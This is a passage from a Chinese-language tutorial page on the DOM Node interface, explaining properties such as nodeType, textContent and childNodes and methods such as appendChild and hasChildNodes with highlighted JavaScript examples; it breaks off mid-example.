<li>子节点关系（childNodes）：直接的下级节点</li>
<li>同级节点关系（sibling）：拥有同一个父节点的节点</li>
</ul>
<p>DOM 提供操作接口，用来获取这三种关系的节点。比如，子节点接口包括<code>firstChild</code>（第一个子节点）和<code>lastChild</code>（最后一个子节点）等属性，同级节点接口包括<code>nextSibling</code>（紧邻在后的那个同级节点）和<code>previousSibling</code>（紧邻在前的那个同级节点）属性。</p>
<h2 id="二、Node接口"><a href="#二、Node接口" class="headerlink" title="二、Node接口"></a>二、Node接口</h2><p> <strong>所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法</strong>。这是 DOM 操作的基础。 </p>
<h3 id="1、属性"><a href="#1、属性" class="headerlink" title="1、属性"></a>1、属性</h3><h4 id="1-1-Node-prototype-nodeType节点类型"><a href="#1-1-Node-prototype-nodeType节点类型" class="headerlink" title="1.1 Node.prototype.nodeType节点类型"></a>1.1 Node.prototype.nodeType节点类型</h4><p><code>nodeType</code>属性<strong>返回一个整数值，表示节点的类型</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">nodeType</span> <span class="comment">// 9</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，文档节点的类型值为9。</p>
<p>Node 对象定义了几个常量，对应这些类型值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">nodeType</span> === <span class="title class_">Node</span>.<span class="property">DOCUMENT_NODE</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，文档节点的<code>nodeType</code>属性等于常量<code>Node.DOCUMENT_NODE</code>。</p>
<p>不同节点的<code>nodeType</code>属性值和对应的常量如下。</p>
<ul>
<li>文档节点（document）：9，对应常量<code>Node.DOCUMENT_NODE</code></li>
<li>元素节点（element）：1，对应常量<code>Node.ELEMENT_NODE</code></li>
<li>属性节点（attr）：2，对应常量<code>Node.ATTRIBUTE_NODE</code></li>
<li>文本节点（text）：3，对应常量<code>Node.TEXT_NODE</code></li>
<li>文档片断节点（DocumentFragment）：11，对应常量<code>Node.DOCUMENT_FRAGMENT_NODE</code></li>
<li>文档类型节点（DocumentType）：10，对应常量<code>Node.DOCUMENT_TYPE_NODE</code></li>
<li>注释节点（Comment）：8，对应常量<code>Node.COMMENT_NODE</code></li>
</ul>
<p>确定节点类型时，使用<code>nodeType</code>属性是常用方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">firstChild</span>; <span class="comment">// 获取到&lt;head&gt;节点</span></span><br><span class="line"><span class="keyword">if</span> (node.<span class="property">nodeType</span> === <span class="title class_">Node</span>.<span class="property">ELEMENT_NODE</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;该节点是元素节点&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-Node-prototype-nodeName节点名称"><a href="#1-2-Node-prototype-nodeName节点名称" class="headerlink" title="1.2 Node.prototype.nodeName节点名称"></a>1.2 Node.prototype.nodeName节点名称</h4><p><code>nodeName</code>属性<strong>返回节点的名称</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line">div.<span class="property">nodeName</span> <span class="comment">// &quot;DIV&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">nodeName</span> <span class="comment">// #document</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，元素节点<code> &lt;div&gt; </code>的<code>nodeName</code>属性就是大写的标签名<code>DIV</code>。</p>
<p>不同节点的<code>nodeName</code>属性值如下。</p>
<ul>
<li>文档节点（document）：<code>#document</code></li>
<li>元素节点（element）：大写的标签名，如DIV</li>
<li>属性节点（attr）：属性的名称</li>
<li>文本节点（text）：<code>#text</code></li>
<li>文档片断节点（DocumentFragment）：<code>#document-fragment</code></li>
<li>文档类型节点（DocumentType）：文档的类型</li>
<li>注释节点（Comment）：<code>#comment</code></li>
</ul>
<h4 id="1-3-Node-prototype-nodeValue当前节点文本"><a href="#1-3-Node-prototype-nodeValue当前节点文本" class="headerlink" title="1.3 Node.prototype.nodeValue当前节点文本"></a>1.3 Node.prototype.nodeValue当前节点文本</h4><p><code>nodeValue</code>属性<strong>返回一个字符串，表示当前节点本身的文本值</strong>，该属性<strong>可读写</strong>。</p>
<p>只有<strong>文本节点（text）、注释节点（comment）和属性节点（attr）有文本值</strong>，因此这三类节点的<code>nodeValue</code>可以返回结果，其他类型的节点一律返回<code>null</code>。同样的，也只有这三类节点可以设置<code>nodeValue</code>属性的值，其他类型的节点设置无效。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line">div.<span class="property">nodeValue</span> <span class="comment">// null</span></span><br><span class="line">div.<span class="property">firstChild</span>.<span class="property">nodeValue</span> <span class="comment">// &quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> textNode = div.<span class="property">firstChild</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(textNode) <span class="comment">// 文本节点对象&quot;hello world&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> textNode) <span class="comment">// object</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(textNode.<span class="property">nodeType</span>) <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(textNode.<span class="property">nodeName</span>) <span class="comment">// #text</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(textNode.<span class="property">nodeValue</span>) <span class="comment">// &#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line">textNode.<span class="property">nodeValue</span> = <span class="string">&#x27;123&#x27;</span> <span class="comment">// 修改文本</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(textNode.<span class="property">nodeValue</span>) <span class="comment">// &#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>div</code>是元素节点，<code>nodeValue</code>属性返回<code>null</code>。<code>div.firstChild</code>是文本节点，所以可以返回文本值。</p>
<h4 id="1-4-Node-prototype-textContent所有文本内容"><a href="#1-4-Node-prototype-textContent所有文本内容" class="headerlink" title="1.4 Node.prototype.textContent所有文本内容"></a>1.4 Node.prototype.textContent所有文本内容</h4><p><code>textContent</code>属性<strong>返回当前节点和它的所有后代节点的文本内容</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;divA&quot;&gt;This is &lt;span&gt;some&lt;/span&gt; text&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divA&#x27;</span>).<span class="property">textContent</span></span><br><span class="line"><span class="comment">// This is some text</span></span><br></pre></td></tr></table></figure>

<p><code>textContent</code>属性自动忽略当前节点内部的 HTML 标签，返回所有文本内容。</p>
<p>该属性是<strong>可读写</strong>的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。它还有一个好处，就是自动对 HTML 标签转义。这很适合用于用户提供的内容。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foo&#x27;</span>).<span class="property">textContent</span> = <span class="string">&#x27;&lt;p&gt;GoodBye!&lt;/p&gt;&#x27;</span>; <span class="comment">// 写入文本</span></span><br></pre></td></tr></table></figure>

<p>上面代码在插入文本时，<strong>会将<code> &lt;p&gt; </code>标签解释为文本</strong>，而不会当作标签处理。</p>
<p>对于文本节点（text）、注释节点（comment）和属性节点（attr），<code>textContent</code>属性的值与<code>nodeValue</code>属性相同。对于其他类型的节点，该属性会将每个子节点（不包括注释节点）的内容连接在一起返回。如果一个节点没有子节点，则返回空字符串。</p>
<p>文档节点（document）和文档类型节点（doctype）的<code>textContent</code>属性为<code>null</code>。如果要<strong>读取整个文档的内容</strong>，可以使用<code>document.documentElement.textContent</code>。</p>
<h4 id="1-5-Node-prototype-baseURI-获取网页路径"><a href="#1-5-Node-prototype-baseURI-获取网页路径" class="headerlink" title="1.5 Node.prototype.baseURI 获取网页路径"></a>1.5 Node.prototype.baseURI 获取网页路径</h4><p><code>baseURI</code>属性<strong>返回一个字符串，表示当前网页的绝对路径</strong>。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为<strong>只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前网页的网址为</span></span><br><span class="line"><span class="comment">// http://www.example.com/index.html</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">baseURI</span></span><br><span class="line"><span class="comment">// &quot;http://www.example.com/index.html&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果无法读到网页的 URL，<code>baseURI</code>属性返回<code>null</code>。</p>
<p>该属性的值一般由当前网址的 URL（即<code>window.location</code>属性）决定，但是可以使用 HTML 的<code>&lt;base&gt;</code>标签，改变该属性的值。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.example.com/page.html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">baseURI</span> <span class="comment">// http://www.example.com/page.html   返回base标签的href值</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>设置了以后，<code>baseURI</code>属性就返回<code>&lt;base&gt;</code>标签设置的值。</p>
<h4 id="1-6-Node-prototype-ownerDocument顶层文档对象"><a href="#1-6-Node-prototype-ownerDocument顶层文档对象" class="headerlink" title="1.6 Node.prototype.ownerDocument顶层文档对象"></a>1.6 Node.prototype.ownerDocument顶层文档对象</h4><p><code>Node.ownerDocument</code>属性<strong>返回当前节点所在的顶层文档对象</strong>，即<code>document</code>对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = p.<span class="property">ownerDocument</span>;</span><br><span class="line">d === <span class="variable language_">document</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><code>document</code>对象本身的<code>ownerDocument</code>属性，返回<code>null</code>。</p>
<h4 id="1-7-Node-prototype-nextSibling下一个同级节点"><a href="#1-7-Node-prototype-nextSibling下一个同级节点" class="headerlink" title="1.7 Node.prototype.nextSibling下一个同级节点"></a>1.7 Node.prototype.nextSibling下一个同级节点</h4><p><code>Node.nextSibling</code>属性<strong>返回紧跟在当前节点后面的第一个同级节点</strong>。如果当前节点后面没有同级节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d1.<span class="property">nextSibling</span> === d2 <span class="comment">// true  // 如果d1和d2之间有空格，会返回文本节点，内容为空格</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>d1.nextSibling</code>就是紧跟在<code>d1</code>后面的同级节点<code>d2</code>。</p>
<p><strong>注意</strong>，该属性还包括文本节点和注释节点（<code>&lt;!-- comment --&gt;</code>）。因此如果当前节点后面有空格，该属性会返回一个文本节点，内容为空格。</p>
<p><code>nextSibling</code>属性可以用来遍历所有子节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">firstChild</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (el !== <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(el.<span class="property">nodeName</span>);</span><br><span class="line">  el = el.<span class="property">nextSibling</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码遍历<code>div1</code>节点的所有子节点。</p>
<h4 id="1-8-Node-prototype-previousSibling上一个同级节点"><a href="#1-8-Node-prototype-previousSibling上一个同级节点" class="headerlink" title="1.8 Node.prototype.previousSibling上一个同级节点"></a>1.8 Node.prototype.previousSibling上一个同级节点</h4><p><code>previousSibling</code>属性<strong>返回当前节点前面的、距离最近的一个同级节点</strong>。如果当前节点前面没有同级节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d2.<span class="property">previousSibling</span> === d1 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>d2.previousSibling</code>就是<code>d2</code>前面的同级节点<code>d1</code>。</p>
<p><strong>注意</strong>，该属性还包括文本节点和注释节点。因此如果当前节点前面有空格，该属性会返回一个文本节点，内容为空格。</p>
<h4 id="1-9-Node-prototype-parentNode父节点"><a href="#1-9-Node-prototype-parentNode父节点" class="headerlink" title="1.9 Node.prototype.parentNode父节点"></a>1.9 Node.prototype.parentNode父节点</h4><p><code>parentNode</code>属性<strong>返回当前节点的父节点</strong>。对于一个节点来说，它的父节点只可能是三种类型：元素节点（element）、文档节点（document）和文档片段节点（documentfragment）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.<span class="property">parentNode</span>) &#123;</span><br><span class="line">  node.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(node); <span class="comment">// node的父节点，然后删除子节点node</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，通过<code>node.parentNode</code>属性将<code>node</code>节点从文档里面移除。</p>
<p>文档节点（document）和文档片段节点（documentfragment）的父节点都是<code>null</code>。另外，对于那些生成后还没插入 DOM 树的节点，父节点也是<code>null</code>。</p>
<h4 id="1-10-Node-prototype-parentElement-父元素节点"><a href="#1-10-Node-prototype-parentElement-父元素节点" class="headerlink" title="1.10 Node.prototype.parentElement 父元素节点"></a>1.10 Node.prototype.parentElement 父元素节点</h4><p><code>parentElement</code>属性<strong>返回当前节点的父元素节点</strong>。如果当前节点没有父节点，或者父节点类型不是元素节点，则返回<code>null</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (node.parentElement) &#123;</span><br><span class="line">  node.parentElement.style.color = &#x27;red&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，父元素节点的样式设定了红色。</p>
<p>由于父节点只可能是三种类型：元素节点、文档节点（document）和文档片段节点（documentfragment）。<code>parentElement</code>属性相当于把后两种父节点都排除了。</p>
<h4 id="1-11-Node-prototype-firstChild-第一个子节点，Node-prototype-lastChild-最后一个子节点"><a href="#1-11-Node-prototype-firstChild-第一个子节点，Node-prototype-lastChild-最后一个子节点" class="headerlink" title="1.11 Node.prototype.firstChild 第一个子节点，Node.prototype.lastChild 最后一个子节点"></a>1.11 Node.prototype.firstChild 第一个子节点，Node.prototype.lastChild 最后一个子节点</h4><p><code>firstChild</code>属性<strong>返回当前节点的第一个子节点</strong>，如果当前节点没有子节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;p1&quot;&gt;&lt;span&gt;First span&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;p1&#x27;</span>);</span><br><span class="line">p1.<span class="property">firstChild</span>.<span class="property">nodeName</span> <span class="comment">// &quot;SPAN&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p</code>元素的第一个子节点是<code>span</code>元素。</p>
<p><strong>注意</strong>，<code>firstChild</code>返回的除了元素节点，<strong>还可能是文本节点或注释节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;p1&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;span&gt;First span&lt;/span&gt;</span></span><br><span class="line"><span class="comment">//  &lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;p1&#x27;</span>);</span><br><span class="line">p1.<span class="property">firstChild</span>.<span class="property">nodeName</span> <span class="comment">// &quot;#text&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p</code>元素与<code>span</code>元素之间有空白字符，这导致<code>firstChild</code>返回的是文本节点。</p>
<p><code>lastChild</code>属性<strong>返回当前节点的最后一个子节点</strong>，如果当前节点没有子节点，则返回<code>null</code>。用法与<code>firstChild</code>属性相同。</p>
<h4 id="1-12-Node-prototype-childNodes-所有子节点，类数组对象，动态集合"><a href="#1-12-Node-prototype-childNodes-所有子节点，类数组对象，动态集合" class="headerlink" title="1.12 Node.prototype.childNodes 所有子节点，类数组对象，动态集合"></a>1.12 Node.prototype.childNodes 所有子节点，类数组对象，动态集合</h4><p><code>childNodes</code>属性<strong>返回一个类似数组的对象</strong>（<code>NodeList</code>集合），<strong>成员包括当前节点的所有子节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>).<span class="property">childNodes</span>; <span class="comment">// 包含元素节点、文本节点、注释节点</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>children</code>就是<code>ul</code>元素的所有子节点。</p>
<p>使用该属性，可以遍历某个节点的所有子节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> children = div.<span class="property">childNodes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文档节点（document）就有两个子节点：文档类型节点（docType）和 HTML 根元素节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">childNodes</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(children[i].<span class="property">nodeType</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，文档节点的第一个子节点的类型是10（即文档类型节点），第二个子节点的类型是1（即元素节点）。</p>
<p><strong>注意</strong>，除了元素节点，<code>childNodes</code>属性的返回值<strong>还包括文本节点和注释节点</strong>。如果当前节点不包括任何子节点，则返回一个空的<code>NodeList</code>集合。由于<code>NodeList</code>对象是一个<strong>动态集合</strong>，一旦子节点发生变化，立刻会反映在返回结果之中。</p>
<h4 id="1-13-Node-prototype-isConnected-是否在文档中，布尔值"><a href="#1-13-Node-prototype-isConnected-是否在文档中，布尔值" class="headerlink" title="1.13 Node.prototype.isConnected 是否在文档中，布尔值"></a>1.13 Node.prototype.isConnected 是否在文档中，布尔值</h4><p><code>isConnected</code>属性<strong>返回一个布尔值，表示当前节点是否在文档之中</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">test.<span class="property">isConnected</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(test);</span><br><span class="line">test.<span class="property">isConnected</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>test</code>节点是脚本生成的节点，没有插入文档之前，<code>isConnected</code>属性返回<code>false</code>，插入之后返回<code>true</code>。</p>
<h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><h4 id="2-1-Node-prototype-appendChild-插入子节点到最后"><a href="#2-1-Node-prototype-appendChild-插入子节点到最后" class="headerlink" title="2.1 Node.prototype.appendChild() 插入子节点到最后"></a>2.1 Node.prototype.appendChild() 插入子节点到最后</h4><p><code>appendChild()</code>方法<strong>接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点</strong>。该方法的<strong>返回值就是插入文档的子节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(p); <span class="comment">// 有返回值，为已插入的p节点</span></span><br></pre></td></tr></table></figure>

<p>上面代码新建一个<code> &lt;p&gt; </code>节点，将其插入<code>document.body</code>的尾部。</p>
<p>如果参数节点是 DOM 已经存在的节点，<code>appendChild()</code>方法会将其从原来的位置，移动到新位置。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>);<span class="comment">// myDiv是已存在的元素</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div); <span class="comment">// 插入已存在元素，相当于移动位置</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，插入的是一个已经存在的节点<code>myDiv</code>，结果就是该节点会从原来的位置，移动到<code>document.body</code>的尾部。</p>
<p>如果<code>appendChild()</code>方法的参数是<code>DocumentFragment</code>节点，那么插入的是<code>DocumentFragment</code>的所有子节点，而不是<code>DocumentFragment</code>节点本身。返回值是一个空的<code>DocumentFragment</code>节点。</p>
<h4 id="2-2-Node-prototype-hasChildNodes-是否有子节点，布尔值"><a href="#2-2-Node-prototype-hasChildNodes-是否有子节点，布尔值" class="headerlink" title="2.2 Node.prototype.hasChildNodes() 是否有子节点，布尔值"></a>2.2 Node.prototype.hasChildNodes() 是否有子节点，布尔值</h4><p><code>hasChildNodes</code>方法返回一个<strong>布尔值</strong>，<strong>表示当前节点是否有子节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (foo.<span class="title function_">hasChildNodes</span>()) &#123;</span><br><span class="line">  foo.<span class="title function_">removeChild</span>(foo.<span class="property">childNodes</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码表示，如果<code>foo</code>节点有子节点，就移除第一个子节点。</p>
<p><strong>注意</strong>，<strong>子节点包括所有类型的节点</strong>，并不仅仅是元素节点。哪怕节点只包含一个空格，<code>hasChildNodes</code>方法也会返回<code>true</code>。</p>
<p>判断一个节点有没有子节点，有许多种方法，下面是其中的三种。</p>
<ul>
<li><code>node.hasChildNodes()</code></li>
<li><code>node.firstChild !== null</code></li>
<li><code>node.childNodes &amp;&amp; node.childNodes.length &gt; 0</code></li>
</ul>
<p><code>hasChildNodes</code>方法结合<code>firstChild</code>属性和<code>nextSibling</code>属性，可以<strong>遍历当前节点的所有后代节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">DOMComb</span>(<span class="params">parent, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (parent.<span class="title function_">hasChildNodes</span>()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> node = parent.<span class="property">firstChild</span>; node; node = node.<span class="property">nextSibling</span>) &#123;</span><br><span class="line">      <span class="title class_">DOMComb</span>(node, callback);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">callback</span>(parent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 